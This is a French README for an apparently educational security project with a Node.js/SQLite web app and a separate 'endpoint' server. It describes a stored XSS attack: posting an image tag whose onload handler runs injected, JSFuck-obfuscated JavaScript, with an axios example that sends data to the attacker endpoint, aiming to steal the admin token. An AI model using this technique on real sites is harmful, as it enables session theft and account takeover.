# projetSecu

- Serveur nodeJs
- Bdd sqLite
- Front html, TailwindCss

## démarche

- lancer le front :
  dans \projetSecu\frontapp
  `npm run serve`

- lancer le back
  dans \projetSecu\webServer
  `node .\server.js`

- lancer l'endpoint
  dans \projetSecu\endPoint
  `node .\endPoint.js`

- poster une photo de ce type :

```
<img class="w-1/3" alt src="https://www.mercurynewscom/wp-content/uploads201905GettyImages-1143958717.jpgw=960" onload="(function(){ *** })();">
```
la fonction est à écrire à l'endroit des ***, de préférence transformée grâce a du jsFuck

exemple de func. envoyant de la data à notre endpoint

```
function send() {
    let obj = {
        test: 'hellloo'
    }
    axios.post('http://localhost:3000/test', obj)
        .then(function (response) {
            console.log(response);
        })
        .catch(function (error) {
            console.log(error);
        });
    console.log("sent")
}
```

on reçoit donc ensuite la data sur le endpoint

## Faille XSS

le but est de récupérer le token admin et de tout casser grace a lui